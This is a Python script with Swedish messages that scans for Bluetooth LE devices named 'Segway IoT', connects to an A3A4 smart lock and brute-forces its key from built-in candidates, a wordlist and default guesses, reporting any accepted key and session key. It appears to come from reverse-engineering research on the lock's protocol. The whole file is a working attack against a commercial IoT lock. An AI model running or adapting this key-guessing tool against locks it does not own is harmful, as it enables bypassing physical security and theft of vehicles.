#!/usr/bin/env python3

"""Testar nyckelkandidater mot ett A3A4-lås utan att låsa upp."""

import argparse
import sys

try:
    import dbus
    from nb_client import ORDER_KEY, key_payload
    from nb_client2 import scan, fresh_connect, dbus_interface
    from nb_client3 import Session, find_chars, UUID_LAS, NYCKLAR
except ImportError as e:
    sys.exit(
        f"saknar beroenden: {e}\n"
        "kor i ~/bletoolre med system-python (/usr/bin/python3) och root."
    )


LANGSHOTS = ["123456", "00000000", "12345678"]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--adapter", default="hci0")
    ap.add_argument("--prefix", default="Segway IoT")
    ap.add_argument("--scan", type=float, default=12.0)
    ap.add_argument("--extra", nargs="*", default=[])
    ap.add_argument("--wordlist", help="fil med en nyckelkandidat per rad")
    args = ap.parse_args()

    wl = []
    if args.wordlist:
        with open(args.wordlist) as f:
            wl = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        print(f"last {len(wl)} kandidater fran {args.wordlist}")

    kandidater = list(dict.fromkeys(NYCKLAR + args.extra + wl + LANGSHOTS))

    bus = dbus.SystemBus()
    root = dbus_interface(
        bus.get_object("org.bluez", "/"), "org.freedesktop.DBus.ObjectManager"
    )
    adapter_iface = dbus.Interface(
        bus.get_object("org.bluez", f"/org/bluez/{args.adapter}"), "org.bluez.Adapter1"
    )

    devs = scan(bus, adapter_iface, root, args.scan)
    mal = [d for d in devs if d["name"].startswith(args.prefix)]
    if not mal:
        print(
            f"ingen enhet med prefix {args.prefix!r} hittades "
            f"(sag {len(devs)} enheter totalt). Ar laset paslaget/inom rackhall?"
        )
        return 1
    target = mal[0]
    print(f"mal: {target['name']!r} {target['addr']} rssi={target['rssi']}")

    dev, sess = None, None
    träffar = []
    try:
        for i, k in enumerate(kandidater, 1):

            if sess is None:
                dev = fresh_connect(
                    adapter_iface, bus, root, target["addr"], target["name"]
                )
                if dev is None:
                    print("  ateranslutning misslyckades - avbryter")
                    break
                wp, np_ = find_chars(root, *UUID_LAS)
                if not (wp and np_):
                    print("  hittade inte GATT-karaktarerna - avbryter")
                    break
                sess = Session(bus, wp, np_)

            print(f"[{i}/{len(kandidater)}] provar {k!r}")
            sess.key = 0x00
            try:
                _, dec = sess.send(
                    ORDER_KEY, key_payload(k), "nyckel", reply_timeout=4.0
                )
            except Exception as e:
                print(f"    skrivfel ({e}) - ateransluter till nasta")
                try:
                    sess.close(dev)
                except Exception:
                    pass
                sess = None
                continue
            if dec is None:
                print("    inget svar")
                continue
            status = dec[6]
            print(f"    status={status}")
            if status == 1:
                print(
                    f"    *** TRAFF: nyckeln ar {k!r} "
                    f"(sessionsnyckel 0x{dec[7]:02X}) ***"
                )
                träffar.append(k)
    finally:
        if sess is not None and dev is not None:
            sess.close(dev)
            print("nerkopplad")

    print()
    print("=" * 40)
    if träffar:
        for k in träffar:
            print(f"  GILTIG NYCKEL: {k}")
    else:
        print("  ingen kandidat accepterades")
    return 0 if träffar else 2


if __name__ == "__main__":
    sys.exit(main())
